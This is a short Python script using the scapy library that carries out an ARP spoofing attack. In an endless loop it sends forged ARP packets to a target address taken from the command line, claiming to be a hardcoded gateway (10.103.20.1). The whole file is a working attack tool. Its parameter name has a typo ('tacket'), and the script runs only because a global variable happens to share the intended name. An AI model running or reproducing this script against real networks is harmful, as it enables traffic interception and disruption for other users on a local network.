import time
import sys

from scapy.all import *

def ARPAttack(tacket, mac='78:45:c4:3b:b9:73',gateway='10.103.20.1'):
	op = 1
	victim = target
	spoof = gateway
	mac = mac

	arp = ARP(op=op, psrc=spoof,pdst=victim, hwdst=mac)
	while 1:
		send(arp)
		time.sleep(5)

if __name__ == "__main__":
	target = sys.argv[1]
	ARPAttack(target)
